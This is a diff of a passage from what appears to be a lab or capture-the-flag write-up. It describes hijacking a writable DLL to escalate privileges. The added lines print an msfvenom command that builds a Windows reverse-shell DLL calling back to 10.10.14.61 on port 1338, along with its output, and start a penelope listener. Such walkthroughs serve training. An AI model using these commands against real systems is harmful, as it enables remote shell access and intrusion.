@@ -508,8 +508,26 @@ As seen here the `support` group has `FullControll` over this path
 I think the best way to abuse this would be to modify the DLL it loads to a malicious one to get a reverse shell
 
 ```python
-
+❯❯❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.61 LPORT=1338 -f dll -o shell.dll 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: shell.dll
 ```
+
+Ill craft a payload using msfvenom
+
+```python
+❯❯❯ penelope -p 1338   
+[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+
+Ill start a listener
+
+
 
 
 
